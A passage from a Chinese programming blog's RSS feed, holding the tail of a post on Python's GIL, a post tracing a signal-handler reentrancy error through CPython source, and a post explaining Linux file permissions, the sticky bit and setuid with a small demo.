elapsed with 3 branch(es): 1.603779 sec(s)</span><br><span class="line">Time elapsed with 4 branch(es): 1.689330 sec(s)</span><br></pre></div></div><p  class="par"> 若注释掉以上两个宏，则结果如下：</p><div class="gk-code hljs" data-gk-id="BLOCK10"><div class="gk-code-display"><pre><span class="line"># CPython, cfib, with-GIL</span><br><span class="line">Time elapsed with 1 branch(es): 1.331415 sec(s)</span><br><span class="line">Time elapsed with 2 branch(es): 2.671651 sec(s)</span><br><span class="line">Time elapsed with 3 branch(es): 4.022696 sec(s)</span><br><span class="line">Time elapsed with 4 branch(es): 5.337917 sec(s)</span><br></pre></div></div><p  class="par"> 可见其中的性能差异。因此当你想做一些计算密集型任务时，不妨尝试用 C 实现，以此规避 GIL。</p><p >值得注意的是，一些著名的科学计算库（如 <code>numpy</code>）为了提升性能，其底层也是用 C 实现的，并且会在做一些线程安全操作（如 <code>numpy</code> 的数组操作）时释放 GIL。因此对于这些库，我们可以放心地使用多线程。以下是一个例子：</p><div class="gk-code hljs" data-gk-id="BLOCK11"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">import</span> numpy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">np_example</span>():</span><br><span class="line">    ones = numpy.ones(<span class="hljs-number">10000000</span>)</span><br><span class="line">    numpy.exp(ones)</span><br></pre></div></div><p  class="par"> 用 CPython 执行 <code>test(np_example)</code> 结果如下：</p><div class="gk-code hljs" data-gk-id="BLOCK12"><div class="gk-code-display"><pre><span class="line"># CPython, np_example</span><br><span class="line">Time elapsed with 1 branch(es): 3.708392 sec(s)</span><br><span class="line">Time elapsed with 2 branch(es): 2.462703 sec(s)</span><br><span class="line">Time elapsed with 3 branch(es): 3.578331 sec(s)</span><br><span class="line">Time elapsed with 4 branch(es): 4.276800 sec(s)</span><br></pre></div></div><h3 id="让线程做该做的事">让线程做该做的事</h3><p >读到这，有同学可能会奇怪了：我在使用 python 多线程写爬虫时可从来没有这种问题啊——用 4 个线程下载 4 个页面的时间与单线程下载一个页面的时间相差无几。</p><p >这里就要谈到 GIL 的第二种释放时机了。除了调用 <code>Py_BEGIN_ALLOW_THREADS</code>，解释器还会在<strong>发生阻塞 IO</strong>（如网络、文件）时释放 GIL。发生阻塞 IO 时，调用方线程会被挂起，无法进行任何操作，直至内核返回；IO 函数一般是原子性的，这确保了调用的线程安全性。因此在大多数阻塞 IO 发生时，解释器没有理由加锁。</p><p >以爬虫为例：当 Thread1 发起对 Page1 的请求后，Thread1 会被挂起，<strong>此时 GIL 释放</strong>。当控制流切换至 Thread2 时，由于没有 GIL，不必干等，而是可以直接请求 Page2……如此一来，四个请求可以认为是几乎同时发起的。时间开销便与单线程请求一次一样。</p><p >有人反对使用阻塞 IO，因为若想更好利用阻塞时的时间，必须使用多线程或进程，这样会有很大的上下文切换开销，而非阻塞 IO + 协程显然是更经济的方式。但当若干任务之间没有偏序关系时，一个任务阻塞是可以接受的（毕竟不会影响到其他任务的执行），同时也会简化程序的设计。而在一些通信模型（如 Publisher-Subscriber）中，“阻塞”是必要的语义。</p><p >多个阻塞 IO 需要多条非抢占式的控制流来承载，这些工作交给线程再合适不过了。</p><h2 id="小结-2">小结</h2><ol><li>由于 GIL 的存在，大多数情况下 Python 多线程无法利用多核优势。</li><li>C 扩展中可以接触到 GIL 的开关，从而规避 GIL，重新获得多核优势。</li><li>IO 阻塞时，GIL 会被释放。</li></ol><h2 id="相关链接">相关链接</h2><ol><li><a href="https://wiki.python.org/moin/GlobalInterpreterLock">GlobalInterpreterLock - Python Wiki</a></li><li><a href="https://en.wikipedia.org/wiki/Blocking_%28computing%29">Blocking(computing) - Wikipedia</a></li><li><a href="https://docs.python.org/3/extending/extending.html">Extending Python with C or C++</a></li><li><a href="https://pypy.org/">PyPy</a></li><li><a href="http://www.jython.org/">Jython</a></li></ol>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Python/">Python</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Multi-Threading/">Multi-Threading</category>
      
      <category domain="https://i.hsfzxjy.site/tags/GIL/">GIL</category>
      
      
      <comments>https://i.hsfzxjy.site/python-gil-and-threads/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>一个 Reentrant Error 引发的对 Python 信号机制的探索和思考</title>
      <link>https://i.hsfzxjy.site/caveats-for-signal-handler-in-python/</link>
      <guid>https://i.hsfzxjy.site/caveats-for-signal-handler-in-python/</guid>
      <pubDate>Wed, 16 Aug 2017 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;写在前面-4&quot;&gt;写在前面&lt;/h2&gt;
&lt;p &gt;前几天工作时遇到了一个匪夷所思的问题。经过几次尝试后问题得以解决，但问题产生的原因却仍令人费解。查找 SO 无果，我决定翻看 Python 的源码。断断续续地研究了几天，终于恍然大悟。撰此文以记。&lt;/p&gt;
&lt;p  cla</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="写在前面-4">写在前面</h2><p >前几天工作时遇到了一个匪夷所思的问题。经过几次尝试后问题得以解决，但问题产生的原因却仍令人费解。查找 SO 无果，我决定翻看 Python 的源码。断断续续地研究了几天，终于恍然大悟。撰此文以记。</p><p  class="noindent"> 本文环境：</p><ul><li>Ubuntu 16.04 (64 bit)</li><li>Python 3.6.2</li></ul><p  class="par"> 使用的 C 源码可以从 <a href="https://www.python.org/ftp/python/3.6.2/Python-3.6.2.tgz">Python 官网</a> 获取。</p><h2 id="起因">起因</h2><p >工作时用到了 celery 作为异步任务队列，为方便调试，我写了一个脚本用以启动/关闭 celery 主进程。代码简化后如下：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">import</span> sys</span><br><span class="line"><span class="hljs-keyword">import</span> subprocess</span><br><span class="line"><span class="hljs-comment"># ...</span></span><br><span class="line">celery_process = subprocess.Popen(</span><br><span class="line">    [<span class="hljs-string">&#x27;celery&#x27;</span>, <span class="hljs-string">&#x27;-A&#x27;</span>, <span class="hljs-string">&#x27;XXX&#x27;</span>, <span class="hljs-string">&#x27;worker&#x27;</span>],</span><br><span class="line">    stdout=subprocess.PIPE,</span><br><span class="line">    stderr=sys.stderr</span><br><span class="line">)</span><br><span class="line"><span class="hljs-keyword">try</span>:</span><br><span class="line">    <span class="hljs-comment"># Start and wait for server process</span></span><br><span class="line"><span class="hljs-keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="hljs-comment"># Ctrl + C pressed</span></span><br><span class="line">    celery_process.terminate()</span><br><span class="line">    celery_process.wait()</span><br></pre></div></div><p  class="par"> 代码启动了 celery worker，并尝试在捕获到 <code>KeyboardInterrupt</code> 异常时将其热关闭。</p><p >初看上去没什么问题。然而实际测试时却发生了十分诡异的事情：按下 <code>Ctrl+C</code> 后，程序 <strong>偶尔</strong> 会抛出这样的异常：<code>RuntimeError: reentrant call inside &lt;_io.BufferedWriter name=&#39;&lt;stdout&gt;&#39;&gt;</code>。诡异之处有两点：</p><ul><li>异常发生的时机有随机性</li><li>异常的 traceback 指向 celery 包，也就是说这是在 celery 主进程内部发生的异常</li></ul><p  class="par"> 这个结果大大出乎了我的意料。随机性异常是众多最难缠的问题之一，因为这常常意味着并发问题，涉及底层知识，病灶隐蔽，调试难度大，同时没有有效的手段判断问题是否彻底解决（可能只是降低了频率）。</p><h2 id="解决">解决</h2><p >异常信息中有两个词很关键：<code>reentrant</code> 和 <code>stdout</code>。<code>reentrant call</code> 说明有一个不可重入的函数被递归调用了；<code>stdout</code> 则指明了发生的地点和时机。初步可以判定：<strong>由于某种原因，有两股控制流在同时操控 <code>stdout</code></strong> 。</p><p >“可重入”是什么？根据 <a href="https://en.wikipedia.org/wiki/Reentrancy_%28computing%29">Wikipedia</a> 的定义：<strong>如果一个子程序能在执行时被中断并在之后被正确地、安全地唤起，它就被称为可重入的</strong>。依赖于全局数据的过程是不可重入的，如 <code>printf</code>（依赖于全局文件描述符）、<code>malloc</code>（依赖与和堆相关的一系列数据结构）等函数。需要注意的是，可重入性（reentrant）与 线程安全性（thread-safe）并不等价，甚至不存在包含关系，<a href="https://en.wikipedia.org/wiki/Reentrancy_%28computing%29#Examples">Wikipedia</a> 中给出了相关的反例。</p><p >多次尝试后，出现了一条线索：有时候 <code>worker: Warm shutdown (MainProcess)</code> 这个字符串会被二次打印，时机不确定。这句话是 celery 将要热关闭时的提示语，二次出现只可能是主进程收到了第二个信号。阅读 <a href="http://docs.celeryproject.org/en/latest/userguide/workers.html#process-signals">celery 的文档</a> 可知，<code>SIGINT</code> 和 <code>SIGTERM</code> 信号可以引发热关闭。回头浏览我的代码，其中只有一处发送了 <code>SIGTERM</code> 信号（<code>celery_process.terminate()</code>），至于另一个神秘的信号，我怀疑是 <code>SIGINT</code>。</p><p >SO 一下，结果印证了我的猜想：</p><blockquote><p >If you are generating the SIGINT with Ctrl-C on a Unix system, then the signal is being sent to the entire process group.– via <a href="https://stackoverflow.com/questions/6803395/child-process-receives-parents-sigint">StackOverflow</a></p></blockquote><p  class="par"> <code>SIGINT</code> 信号不仅会发送到父进程，而是会发到整个进程组，默认情况下包括了所有子进程。也就是说——在拦截了 <code>KeyboardInterrupt</code> 之后执行的 <code>celery_process.terminate()</code> 是多此一举，因为 <code>SIGINT</code> 信号也会被发送至 celery 主进程，同样会引起热关闭。代码稍作修改即可正常运行：</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment"># ...</span></span><br><span class="line"><span class="hljs-keyword">try</span>:</span><br><span class="line">    <span class="hljs-comment"># Start and wait for server process</span></span><br><span class="line"><span class="hljs-keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="hljs-comment"># Ctrl + C pressed</span></span><br><span class="line">    <span class="hljs-keyword">pass</span></span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">    <span class="hljs-comment"># Signal SIGTERM if no exception raised</span></span><br><span class="line">    celery_process.terminate()</span><br><span class="line"><span class="hljs-keyword">finally</span>:</span><br><span class="line">    <span class="hljs-comment"># Wait for it to avoid it becoming orphan</span></span><br><span class="line">    celery_process.wait()</span><br></pre></div></div><h2 id="猜测">猜测</h2><p >UNIX 信号处理是一个相当奇葩的过程——当进程收到一个信号时，内核会选择一条线程（以一定的规则），中断其当前控制流，将控制流强行转给信号处理函数，待其执行完毕后再将控制流交还给原线程。时序图如下：</p><p ><img loading="lazy" src="/assets/caveats-for-signal-handler-in-python/bVS7gW" alt=""></p><p >由于控制流转换发生在同一条线程上，许多线程间同步机制会失效甚至报错。因此信号处理函数的编写要比线程函数更加严格，对同一个文件输出是被禁止并且无解的，因为很可能会发生这样的事情：</p><p ><img loading="lazy" src="/assets/caveats-for-signal-handler-in-python/bVS7nP" alt=""></p><p >而且这个问题不能通过加锁来解决（因为是在同一个线程中，会死锁）。</p><p >因此，我猜测异常发生时的事件时序是这样的：在 <code>print</code> 未执行完时中断，又在信号处理函数中调用 print，触发了重入检测，引起 <code>RuntimeError</code>：</p><p ><img loading="lazy" src="/assets/caveats-for-signal-handler-in-python/bVS831" alt=""></p><h2 id="疑云又起">疑云又起</h2><p >不幸的是，我的猜想很快被推翻了。</p><p >在翻看 Python <code>signal</code> 模块的官方文档，我看到了如下叙述：</p><blockquote><p >A Python signal handler does not get executed inside the low-level (C) signal handler. Instead, the low-level signal handler sets a flag which tells the virtual machine to execute the corresponding Python signal handler at a later point(for example at the next bytecode instruction).<cite>– via <a href="https://docs.python.org/3/library/signal.html?highlight=signal#execution-of-python-signal-handlers">Python Documentation</a></cite></p></blockquote><p  class="par"> 也就是说，<strong>Python 中使用 <code>signal.signal</code> 注册的信号处理函数并不会在收到信号时立即执行，而只是简单做一个标记，将其延迟至之后的某个时机</strong>。这么做可以尽量快地结束异常控制流，减少其对被阻断进程的影响。</p><p >这番表述可以说是推翻了我的猜想，因为 Signal Handler 中的 <code>print</code> 并没有在异常控制流中执行。那异常又是怎么产生的呢？</p><p >文档说 Python Signal Handler 会被延后至某个时机进行，但并没有明示是什么时候。对于这个疑问，<a href="https://stackoverflow.com/questions/19699314/how-to-use-a-separate-thread-for-asynchronous-signal-handling-in-python">这个提问的被采纳回答</a> 则斩钉截铁地将其具体化到了“某两个 Python 字节码之间”。</p><p >我们知道，Python 程序在执行前会被编译成 Python 内定的字节码（bytecode）,Python 虚拟机实际执行的正是这些字节码。倘若该回答是正确的，则立即有如下推论：<strong>在处理信号的过程中，字节码具有原子性（atomic）</strong>。也就是说，主线程总是在两个字节码之间决定是否转移控制流，而 <strong>不会</strong> 出现以下情况：</p><p ><img loading="lazy" src="/assets/caveats-for-signal-handler-in-python/bVS7EH" alt=""></p><p >这很显然与我的程序结果相悖：<code>print</code> 与 <code>print</code> 所调用的 <code>io.BufferedWriter.write</code> 和 <code>io.BufferedWriter.flush</code> 都是用纯 C 代码编写的，对其的调用只消耗一条字节码（<code>CALL_FUNCTION</code> 或 <code>CALL_FUNCTION_KW</code>），在信号中断的影响下，这几个函数仍保持原子性，在时序图上互不重叠，更不会发生重入。</p><p ><img loading="lazy" src="/assets/caveats-for-signal-handler-in-python/bVS7ag" alt=""></p><p >因此，<strong>除了在两个字节码之间，应该还有其他时机唤起了 Python Signal Handler</strong>。</p><p >至此，问题已触及 Python 的地板了，需向更底层挖掘才能找到答案。</p><h2 id="深入源码">深入源码</h2><p >信号注册逻辑位于 <code>Modules/signalmodule.c</code> 文件中。313 行的 <code>signal_handler</code> 是信号处理函数的最外层包装，由系统调用 <code>signal</code> 或 <code>sigaction</code> 注册至内核，并在信号发生时被内核回调，是异常控制流的入口。<code>signal_handler</code> 主要调用了 239 行处的 <code>trip_signal</code> 函数，其中有这样一段代码：</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line">Handlers[sig_num].tripped = <span class="hljs-number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (!is_tripped) {</span><br><span class="line">    is_tripped = <span class="hljs-number">1</span>;</span><br><span class="line">    Py_AddPendingCall(checksignals_witharg, <span class="hljs-literal">NULL</span>);</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> 这段代码便是文档中所说的逻辑：做标记并延后 Python Signal Handler。其中 <code>checksignals_witharg</code> 即为被延后调用的函数，位于 192 行，核心代码只有一句：</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"><span class="hljs-type">static</span> <span class="hljs-type">int</span></span><br><span class="line"><span class="hljs-title function_">checksignals_witharg</span><span class="hljs-params">(<span class="hljs-type">void</span> * unused)</span></span><br><span class="line">{</span><br><span class="line">    <span class="hljs-keyword">return</span> PyErr_CheckSignals();</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> <code>PyErr_CheckSignals</code> 位于 1511 行：</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line"><span class="hljs-type">int</span></span><br><span class="line"><span class="hljs-title function_">PyErr_CheckSignals</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="hljs-type">int</span> i;</span><br><span class="line">    PyObject *f;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (!is_tripped)</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> WITH_THREAD</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (PyThread_get_thread_ident() != main_thread)</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line"><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    is_tripped = <span class="hljs-number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (!(f = (PyObject *)PyEval_GetFrame()))</span><br><span class="line">        f = Py_None;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; NSIG; i++) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (Handlers[i].tripped) {</span><br><span class="line">            PyObject *result = <span class="hljs-literal">NULL</span>;</span><br><span class="line">            PyObject *arglist = Py_BuildValue(<span class="hljs-string">&quot;(iO)&quot;</span>, i, f);</span><br><span class="line">            Handlers[i].tripped = <span class="hljs-number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">if</span> (arglist) {</span><br><span class="line">                result = PyEval_CallObject(Handlers[i].func,</span><br><span class="line">                                           arglist);</span><br><span class="line">                Py_DECREF(arglist);</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-keyword">if</span> (!result)</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;</span><br><span class="line"></span><br><span class="line">            Py_DECREF(result);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> 可见，这个函数便是异步回调的最里层，包含了执行 Python Signal Handler 的逻辑。</p><p >至此我们可以发现，整个 Python 中有两个办法可以唤起 Python Signal Handler，一个是调用 <code>checksignals_witharg</code>，另一个是调用 <code>PyErr_CheckSignals</code>。前者只是后者的简单封包。</p><p ><code>checksignals_witharg</code> 在 Python 源码中只出现了一次（不包括定义，下同），没有被直接调用的迹象。但需要注意的是，<code>checksignals_witharg</code> 曾被当做 <code>Py_AddPendingCall</code> 的参数，<code>Py_AddPendingCall</code> 所做的工作时将其加入到一个全局队列中。与之对应的出队操作是 <code>Py_MakePendingCalls</code>，位于 <code>Python/ceval.c</code> 的 464 行。此函数会间接调用 <code>checksignals_witharg</code>，在 Python 源码中被调用了 3 次：</p><ul><li><code>Modules/_threadmodule.c</code> 52 行的 <code>acquire_timed</code></li><li><code>Modules/main.c</code> 310 行的 <code>run_file</code></li><li><code>Python/ceval.c</code> 722 行的 <code>_PyEval_EvalFrameDefault</code></li></ul><p  class="par"> 值得注意的是，<code>_PyEval_EvalFrameDefault</code> 是一个长达 2600 多行的状态机，是解析字节码的核心逻辑所在。此处调用出现于状态机主循环开始处——这印证了上面回答中的部分说法，即 Python 会在两个字节码中间唤起 Python Signal Hanlder。</p><p >而 <code>PyErr_CheckSignals</code> 在 Python 源码中出现了 80 多处，遍布 Python 的各个模块中——这说明该回答的另一半说法是错误的：<strong>除了在两个字节码之间，Python 还可能在其他角落唤起 Python Signal Handler</strong>。其中有两处值得注意，它们都位于 <code>Modules/_io/bufferedio.c</code> 中：</p><ul><li>1884 行的 <code>_bufferedwriter_flush_unlocked</code></li><li>1939 行的 <code>_io_BufferedWriter_write_impl</code></li></ul><p  class="par"> 这两个函数是 <code>io.BufferedWriter</code> 类的底层实现，会被 <code>print</code> 间接调用。仔细观察可以发现，它们都有着相似的结构：</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line">ENTER_BUFFERED(self)</span><br><span class="line"><span class="hljs-comment">// ...</span></span><br><span class="line">PyErr_CheckSignals();</span><br><span class="line"><span class="hljs-comment">// ...</span></span><br><span class="line">LEAVE_BUFFERED(self)</span><br></pre></div></div><p  class="par"> <code>ENTER_BUFFERED</code> 是一个宏，会尝试申请无阻塞线程锁以保证函数不会被重入：</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-keyword">define</span> ENTER_BUFFERED(self) \</span></span><br><span class="line"><span class="hljs-meta">    ( (PyThread_acquire_lock(self-&gt;lock, 0) ? \</span></span><br><span class="line"><span class="hljs-meta">       1 : _enter_buffered_busy(self)) \</span></span><br><span class="line"><span class="hljs-meta">     &amp;&amp; (self-&gt;owner = PyThread_get_thread_ident(), 1) )</span></span><br></pre></div></div><p ><img loading="lazy" src="/assets/caveats-for-signal-handler-in-python/bVS9AJ" alt=""></p><p >至此，真相已经大白了。</p><h2 id="真相-1">真相</h2><p >当信号中断发生在 <code>_bufferedwriter_flush_unlocked</code> 或 <code>_io_BufferedWriter_write_impl</code> 中时，这两个函数中的 <code>PyErr_CheckSignals</code> 会直接唤起 Python Signal Handler，而此时由 <code>ENTER_BUFFERED</code> 上的锁尚未解开，若 Python Signal Handler 中又有 <code>print</code> 函数调用，则会导致再次 <code>ENTER_BUFFERED</code> 上锁失败，从而抛出异常。时序图如下：</p><p ><img loading="lazy" src="/assets/caveats-for-signal-handler-in-python/bVS9lQ" alt=""></p><h2 id="思考">思考</h2><p >为什么不将 Python Signal Handler 调用的地点统一在一个地方，而是散布在程序的各处呢？阅读相关代码，我认为有两点原因：</p><ul><li>信号中断会使某些系统调用行为异常，从而使系统调用的调用者不知如何处理，此时需要调用 Signal Handler 进行可能的状态恢复。一个例子是 <code>write</code> 系统调用，信号中断会导致数据部分写回，与此相关的一大批 I/O 函数（包括出问题的 <code>_bufferedwriter_flush_unlocked</code> 和 <code>_io_BufferedWriter_write_impl</code>）便只能相应地调用 <code>PyErr_CheckSignals</code>。</li><li>某些函数需要做计算密集型任务，为了防止 Python Signal Handler 的调用被过长地延后（其实主要是为了及时响应键盘中断，防止程序无法从前台结束），必须适时地检查并调用 Python Signal Handler。一个例子是 <code>Objects/longobject.c</code> 中的诸函数，<code>longobject.c</code> 定义了 Python 特有的无限长整型，其相关的运算可能耗时相当长，必须做这样的处理。</li></ul><h2 id="总结">总结</h2><ul><li>Python Signal Handler 的调用会被延后，但时机不止在两个字节码之间，而是可能出现在任何地方。</li><li>由于第一条，Python Signal Handler 中尽量都使用 <strong>可重入的</strong> 的函数，以避免奇怪的问题。可重入性可以从文档获知，也可以结合定义由源码推断出来。</li><li>有疑问，翻源码。人会说谎，代码不会。</li></ul>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Python/">Python</category>
      
      <category domain="https://i.hsfzxjy.site/tags/POSIX/">POSIX</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Reentrancy/">Reentrancy</category>
      
      
      <comments>https://i.hsfzxjy.site/caveats-for-signal-handler-in-python/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Linux 文件权限</title>
      <link>https://i.hsfzxjy.site/linux-file-permissions/</link>
      <guid>https://i.hsfzxjy.site/linux-file-permissions/</guid>
      <pubDate>Sun, 02 Jul 2017 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;概念&quot;&gt;概念&lt;/h1&gt;
&lt;p &gt;Linux 中的每一个文件都有其 &lt;strong&gt;所属用户&lt;/strong&gt; 及 &lt;strong&gt;所属用户组&lt;/strong&gt;，根据这两个属性可将文件访问者分为三类：&lt;strong&gt;所属用户自己&lt;/strong&gt;、&lt;strong&gt;所</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="概念">概念</h1><p >Linux 中的每一个文件都有其 <strong>所属用户</strong> 及 <strong>所属用户组</strong>，根据这两个属性可将文件访问者分为三类：<strong>所属用户自己</strong>、<strong>所属用户组中的用户</strong> 和 <strong>其他用户</strong>，我们可以针对不同的访问者设置不同的用户权限。</p><p >“访问”可分为三类：<strong>读</strong>、<strong>写</strong> 与 <strong>执行</strong>。我们可以用 <code>ls -l</code> 命令查看一个文件的权限：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">$ <span class="hljs-built_in">touch</span> <span class="hljs-built_in">test</span></span><br><span class="line">$ <span class="hljs-built_in">ls</span> -l <span class="hljs-built_in">test</span></span><br><span class="line">-rw-rw-r-- 1 hsfzxjy hsfzxjy 0 Jul  3 23:44 <span class="hljs-built_in">test</span></span><br></pre></div></div><p  class="par"> 首部的 <code>-rw-rw-r--</code> 即为文件的权限位。权限应该分为四部分来看：<code>-/rw-/rw-/r--</code>。第一部分标志文件的类型，如 普通文件（<code>-</code>）、目录（<code>d</code>）、UNIX 套接字（<code>s</code>）、符号链接（<code>l</code>）、块设备（<code>b</code>）等等。接下来的三个部分依次代表 <strong>所属用户</strong>、<strong>所属用户组</strong>、<strong>其他用户</strong> 的权限，每部分由三个标志位组成：<strong>读标志位</strong>、<strong>写标志位</strong>、<strong>执行标志位</strong>。</p><h1 id="目录的权限">目录的权限</h1><p >目录是一种特殊的文件，因此也拥有文件权限的概念，但权限的语义与普通文件稍有差异：</p><ul><li>读：读取目录下文件列表，相关命令如 <code>ls</code></li><li>写：创建、删除目录下的文件，相关命令如 <code>touch</code>（当文件不存在时）、<code>rm</code> 等</li><li>执行：进入目录，相关命令如 <code>cd</code></li></ul><h1 id="特殊权限">特殊权限</h1><p >出于某些特殊目的，Linux 中存在两个特殊的权限位：粘滞位（<code>t</code>）、Set Id（<code>s</code>）。这两个权限可以 <strong>叠加</strong> 在执行权限位上，其中 Set Id 可以置于 <strong>所属用户</strong> 和 <strong>所属用户组</strong> 的权限组上，而 粘滞位 只能置于 <strong>其他用户</strong> 权限组上。当特殊权限被设置时，执行权限位上即会显示 <code>s/t</code> （已有 <code>x</code> 权限）或 <code>S/T</code> （尚未有 <code>x</code> 权限）。</p><h2 id="粘滞位">粘滞位</h2><p >粘滞位的作用是 <strong>防止他人误删自己的文件</strong>。当某个目录的其他用户权限组有 <code>w</code> 权限时，系统中的其他用户即可随意删除目录中的文件。而一旦叠加上 <code>t</code> 权限，只有文件的所有者方能删除文件。一个经典的例子是 <code>/tmp</code>：</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">$ <span class="hljs-built_in">ls</span> -l /</span><br><span class="line">drwxrwxrwt  13 root root 12288 Jul  4 00:15 tmp/</span><br></pre></div></div><h2 id="set-id">Set Id</h2><p >Linux 中的进程也有自己所属用户与用户组。一般而言，进程的所属用户即为其发起者，但这会引起一些麻烦。一个例子是 <code>passwd</code> 命令，该命令需要修改属于 <code>root</code> 用户的系统文件以保存密码，倘若进程所属用户即为所属者，此功能则无法实现。</p><p >Set Id 权限的作用是：在文件被执行时，将其有效用户/用户组设置为文件的用户/用户组，而不是当前执行者。下面是一个演示：</p><p >设当前用户为 <code>hsfzxjy</code>，我们在 <code>/tmp</code> 下创建一个 <code>test</code> 文件，并删去其他用户的 <code>r</code> 权限：</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line">$ <span class="hljs-built_in">cd</span> /tmp</span><br><span class="line">$ <span class="hljs-built_in">echo</span> <span class="hljs-built_in">test</span> text &gt; <span class="hljs-built_in">test</span></span><br><span class="line">$ <span class="hljs-built_in">chmod</span> o-r <span class="hljs-built_in">test</span></span><br><span class="line">$ ll <span class="hljs-built_in">test</span></span><br><span class="line">-rw-rw---- 1 hsfzxjy hsfzxjy 0 Jul  4 00:28 <span class="hljs-built_in">test</span></span><br></pre></div></div><p  class="par"> 由于 <code>test</code> 文件的所属用户是 <code>hsfzxjy</code>，其他用户没有权限读取其中的内容：</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line">$ sudo -u mysql <span class="hljs-built_in">cat</span> <span class="hljs-built_in">test</span></span><br><span class="line"><span class="hljs-built_in">cat</span>: <span class="hljs-built_in">test</span>: Permission denied</span><br></pre></div></div><p  class="par"> 现在我们修改一下 <code>cat</code> 命令的权限，为了不影响系统文件，我们拷贝一份 <code>cat</code> 副本至当前目录：</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line">$ <span class="hljs-built_in">cp</span> /bin/cat .</span><br><span class="line">$ <span class="hljs-built_in">chmod</span> u+s <span class="hljs-built_in">cat</span></span><br><span class="line">$ ll <span class="hljs-built_in">cat</span></span><br><span class="line">-rwsr-xr-x 1 hsfzxjy hsfzxjy 52080 Jul  4 00:34 <span class="hljs-built_in">cat</span>*</span><br></pre></div></div><p  class="par"> 再以 <code>mysql</code> 的身份执行命令：</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line">$ sudo -u mysql ./cat <span class="hljs-built_in">test</span></span><br><span class="line"><span class="hljs-built_in">test</span> text</span><br></pre></div></div><p  class="par"> 可见 <code>./cat</code> 在执行时所属用户是 <code>hsfzxjy</code>。我们可以使用 <code>ps</code> 命令更清楚地看到这点：</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line">$ sudo -u mysql <span class="hljs-built_in">cat</span></span><br><span class="line"><span class="hljs-comment"># 在另一个终端中</span></span><br><span class="line">$ ps -eo euser,ruser,<span class="hljs-built_in">comm</span> | grep <span class="hljs-built_in">cat</span></span><br><span class="line">mysql    mysql    <span class="hljs-built_in">cat</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># -----------</span></span><br><span class="line"></span><br><span class="line">$ sudo -u mysql ./cat</span><br><span class="line"><span class="hljs-comment"># 在另一个终端中</span></span><br><span class="line">$ ps -eo euser,ruser,<span class="hljs-built_in">comm</span> | grep <span class="hljs-built_in">cat</span></span><br><span class="line">hsfzxjy  mysql    <span class="hljs-built_in">cat</span></span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Linux/">Linux</category>
      
      <category domain="https://i.hsfzxjy.site/tags/File-Permissions/">File Permissions</category>
      
      
      <comments>https://i.hsfzxjy.site/linux-file-permissions/#disqus_thread</comments>
      
    </item>
    
    <item>
